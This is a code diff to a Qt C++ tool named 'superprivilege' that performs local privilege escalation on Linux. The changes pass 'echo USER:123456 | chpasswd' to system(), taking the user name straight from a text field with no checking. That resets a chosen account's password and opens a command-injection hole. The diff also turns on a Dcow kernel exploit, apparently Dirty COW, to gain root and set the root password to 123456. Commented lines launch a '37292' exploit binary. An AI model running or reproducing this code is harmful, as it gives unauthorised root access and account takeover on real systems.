@@ -324,6 +324,7 @@ void superprivilege::appendOutputV(QString output) {
 
     QString strOldRecord = m_textResultVertical->toPlainText().left(1024);
     m_textResultVertical->setPlainText(strOldRecord + output);
+    m_textResultVertical->moveCursor(QTextCursor::End);
 
 
 }
@@ -331,16 +332,22 @@ void superprivilege::appendOutputH(QString output) {
     output = "["+getcurrenttime()+"] "+output+"\n";
     QString strOldRecord = m_textResultHorizon->toPlainText().left(1024);
     m_textResultHorizon->setPlainText(strOldRecord+output);
+    m_textResultHorizon->moveCursor(QTextCursor::End);
+
 }
 void superprivilege::appendOutputOff(QString output) {
     output = "["+getcurrenttime()+"] "+output+"\n";
     QString strOldRecord = m_textResultOffline->toPlainText().left(1024000);
     m_textResultOffline->setPlainText(strOldRecord+ output);
+    m_textResultOffline->moveCursor(QTextCursor::End);
+
 }
 void superprivilege::appendOutputOn(QString output) {
     output = "["+getcurrenttime()+"] "+output+"\n";
     QString strOldRecord = m_textResultOnline->toPlainText().left(1024);
     m_textResultOnline->setPlainText(strOldRecord+ output);
+    m_textResultOnline->moveCursor(QTextCursor::End);
+
 }
 
 void superprivilege::verticalPrivilege()
@@ -363,66 +370,111 @@ void superprivilege::showAllUser()
 
 void superprivilege::horizontalPrivilege()
 {
+//    QString cmd = "echo ";
+//    cmd+=m_inputuser->text();
+//    cmd+=+":";
+//    cmd+="123456";
+//    cmd+=" | chpasswd";
+//    QString result = CSysUtils::execCmd(cmd);
+//    appendOutputH(result);
+//    appendOutputH("横向提权成功，已经将用户："+m_inputuser->text()+" 密码篡改为：123456");
+
     QString cmd = "echo ";
     cmd+=m_inputuser->text();
     cmd+=+":";
     cmd+="123456";
     cmd+=" | chpasswd";
-    QString result = CSysUtils::execCmd(cmd);
-    appendOutputH(result);
-    appendOutputH("横向提权成功，已经将用户："+m_inputuser->text()+" 密码篡改为：123456");
+    QByteArray ba = cmd.toLatin1(); // must
+
+//    FILE *pf;
+//    char buffer[4096];
+//    pf = popen(ba.data(), "r");
+//    fread(buffer, sizeof(buffer), 1, pf);
+//    printf("%s\n", buffer);
+//    appendOutput(buffer);
+//    pclose(pf);
+
+//    appendOutputH(runcmd(cmd));
+
+    int iret = system(ba.data());
+    QString msg="";
+    if(iret==0)
+    {
+        msg = "横向提权，已经将用户：:"+m_inputuser->text()+" 密码篡改为：123456";
+    }
+    else
+    {
+        msg = "横向提权，用户:"+m_inputuser->text()+"密码篡改 ERROR.";
+    }
+
+    appendOutputH(msg);
 
 
 }
 
 int superprivilege::powerAuthority()
 {
+
 //    appendOutputV("纵向提权成功，已经获取root权限.");
 //    return 0;
-
+/*
+// *** for test bash
+//    runcmd("./1.sh");
+//    return 0;
+// *** for test bash end
+/**/
     //在目標機上測試執行
 //    c37292 *p37292 = new c37292();
 //    return p37292->attack();
 
-//    system("./37292");//OK
-//    system("su -");
+/*
+// *** for test bash
+    system("./37292");//OK
+//    system("su");
+//    system("");
+    runcmd("su -");
+    return 0;
+/**/
+
+/*
+    QProcess p(0);
+    p.start("./37292");
+
+    p.waitForStarted();
+
+//    QString str="ls -l";
+//    const char *cstr= str.toLocal8Bit().constData();
+//    p.write(cstr);
+//    p.write("\n\r");
+
+//    p.waitForFinished();
+    sleep(2);
+
+    QString strTemp=QString::fromLocal8Bit(p.readAllStandardOutput());
+
+    QString str="ls -l";
+    const char *cstr= str.toLocal8Bit().constData();
+    p.write(cstr);
+    p.write("\n\r");
+
+    appendOutputV(strTemp);
+/**/
 //    appendOutputV(runcmd("su -"));
 
 //    system("./dcow -s");
 //    appendOutputV(runcmd("dcow -s"));
 
+/*************************/
+    //test 0k
     Dcow dcow(true, true);
     dcow.expl();
+/*************************/
+
+
 
     appendOutputV(runcmd("whoami"));
+    appendOutputV("root new password is 123456");
 
-//   const char  flags[]   = "shn";
-//   int         c;
-//   bool        opShell   = false,
-//               restPwd   = argc != 1 ? true : false;
-
-//   opterr = 0;
-//            opShell = true;
-//         break;
-//         case 'n':
-//            restPwd = false;
-//         break;
-//         case 'h':
-//            printInfo(argv[0]);
-//         break;
-//         default:
-//            cerr << "Invalid parameter." << endl << endl;
-//            printInfo(argv[0]);
-//      }
-//   }
-
-//   if(!restPwd && !opShell && argc != 1){
-//            cerr << "Invalid parameter: -n requires -s" << endl << endl;
-//            printInfo(argv[0]);
-//   }
-
-//   Dcow dcow(opShell, restPwd);
-//   return dcow.expl();
 
     return 0;
 
